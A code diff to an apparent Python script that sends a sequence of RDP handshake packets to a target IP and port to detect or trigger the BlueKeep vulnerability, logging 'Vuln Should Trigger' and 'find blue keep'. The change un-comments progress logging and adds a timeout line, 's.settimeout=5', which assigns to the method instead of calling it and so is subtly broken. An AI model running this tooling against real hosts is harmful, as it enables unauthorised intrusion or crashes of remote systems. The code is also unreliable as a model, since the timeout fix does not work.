@@ -71,6 +71,7 @@ def send_init_packets(ip,port):
 	tpkt['TPDU'] = tpdu.getData()
 	try:
 		s = socket.socket()
+		s.settimeout=5
 		s.connect((ip, port))
 	except:
 		logging.info("[*] time out")
@@ -158,17 +159,17 @@ def main(args):
 	try:
 		tls = send_init_packets(args[1],int(args[2]))
 		send_client_data(tls)
-		# logging.info("[+] ClientData Packet Sent")
+		logging.info("[+] ClientData Packet Sent")
 		send_channel_packets(tls)
-		# logging.info("[+] ChannelJoin/ErectDomain/AttachUser Sent")
+		logging.info("[+] ChannelJoin/ErectDomain/AttachUser Sent")
 		send_client_info(tls)
-		# logging.info("[+] ClientInfo Packet Sent")
+		logging.info("[+] ClientInfo Packet Sent")
 		tls.recv(8192)
 		tls.recv(8192)
 		send_confirm_active(tls, None)
-		# logging.info("[+] ConfirmActive Packet Sent")
+		logging.info("[+] ConfirmActive Packet Sent")
 		send_establish_session(tls)
-	# 	logging.info("[+] Session Established")
+		logging.info("[+] Session Established")
 	#  
     # 	logging.info("[+] Vuln Should Trigger")
 		logging.info("[+] {} find blue keep".format(ip))
